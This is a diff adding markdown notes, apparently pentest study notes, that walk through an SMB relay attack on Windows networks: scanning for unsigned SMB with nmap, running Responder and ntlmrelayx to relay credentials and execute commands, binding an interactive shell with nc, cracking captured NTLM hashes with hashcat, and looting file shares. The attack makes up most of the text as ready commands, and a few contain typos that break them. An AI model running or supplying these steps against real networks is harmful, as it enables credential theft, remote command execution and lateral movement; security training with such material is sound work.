@@ -1,0 +1,123 @@
+- **Attack Requirements:**
+    1. SMB signing must be disabled or not enforced on the target I.e. enabled but not required or not enabled at all.
+        
+        Eg: `$ nmap –script=smb2-security-mode.nse -p445 <Domain_Controller-ip> -Pn`
+        
+        *Host script results:*
+        
+        *| smb2-security-mode:* 
+        
+        *|   3:1:1:* 
+        
+        *|_    **Message signing enabled but not required***
+        
+    2. User credentials must be local admin on the machine for them to be of any real value, in order to get further access. 
+    3. You can't relay a credential to yourself
+    
+- **The Attack:**
+    
+    **SMB Relay attack - Example**
+    
+    1. **Id TARGETS** / hosts without SMB enabled or required:
+        
+        `nmap –script=smb2-security-mode.nse -p445 <Domain_Controller-ip> -Pn`
+        
+        We can sweep the whole network using CIDR notation.
+        
+        We can use various scripts above for specific attacks.
+        
+    2. Create a targets file containing their ip addresses: 
+        
+        `$ nano target.txt`
+        
+        1. Configure Responder: *Switch off SMB & HTTP*
+            
+            `locate Responder.conf` 
+            
+            `sudo nano /path/to/Responder.conf` #eg /opt/Responder/Responder.conf
+            
+        2. Run responder (adding “-I” gives an interactive shell): 
+            
+            `sudo responder -I eth0 -dwPv`
+            
+            If you get error: “You cannot use WPAD server and Proxy_Auth server at the same time, choose one of them.” Use `sudo responder -I eth0 -dPv`
+            
+        3. The ntlamrelay will relay to the targets. 
+            
+            `ntlmrelayx.py -tf targets.txt -smb2support` 
+            
+            `ntlmrelayx.py -tf targets.txt -smb2support --smb-port 8445`
+            
+            or
+            
+            `ntlmrelayx.py -tf targets.txt -smb2support -c “whoami”`
+            
+            `ntlmrelayx.py -tf targets.txt -smb2support --smb-port 8445 -c “whoami”`
+            
+            ntlmrelayx.py is from pimpmykali alt try `$ impacket-ntlmrelayx`. (v0.9.19 works best)
+            
+        4. Go to your target machine and point it to the attacking machine e.g. by typing the `[attacker_ip]` in the file explorer address bar.
+        5. Copy out the hashes and save them to file to crack them offline with hashcat
+            
+            Cracking Hashes with Hashcat
+            
+        
+        ### Alternative way
+        
+        1. Ase interactive way with the “-I”
+            
+            `$ ntlmrelayx.py -tf targets.txt -smb2suppport -I`
+            
+            or
+            
+            `ntlmrelayx.py -tf targets.txt -smb2support --smb-port 8445`
+            
+        2. Go to your target machine and point it to the attacking machine e.g. by typing the ip in the file explorer address bar.
+        3. Now on the attacking machine bind with the client shell using: 
+            
+            `$ nc 127.0.0.1 1100`
+            
+            `$ help` Will provide a list of commands that you can run
+            
+    
+    1. Try this or add another command in the place of “whoami” like adding a file etc:
+        
+        `$ ntlmrelayx.py -tf targets.txt -smb2suppport -I ”whoami”`
+        
+    2. Go to your target machine and point it to the attacking machine e.g. by typing the ip in the file explorer address bar.
+    
+    - Meaning of dumping out smb
+        
+        Typically, when someone says, "**dumping SMB**," they’re doing one of these:
+        
+        ### 1. **Listing and downloading SMB shares**
+        
+        Using tools like:
+        
+        ``` 
+        smbclient //target/share -U user
+        ```
+        
+        or
+        
+        ``` 
+        smbmap -H 10.10.10.10
+        ```
+        
+        To list accessible shared folders and download files.
+        
+        ### 2. **Capturing SMB authentication hashes**
+        
+        Using responder, NTLM relay, or tools like `smbserver.py` to trick a target into connecting and leaking NTLM hashes:
+        
+        ``` 
+        responder -I eth0
+        ```
+        
+        ---
+        
+            
+        - **Dumping the SAM** = extracting **local user hashes** from the system
+        - **Dumping SMB** = accessing or looting **file shares** or **capturing hashes** via the SMB protocol
+        
+        Let me know what context you're working with (live machine, lab, tool), and I can tailor a hands-on example.
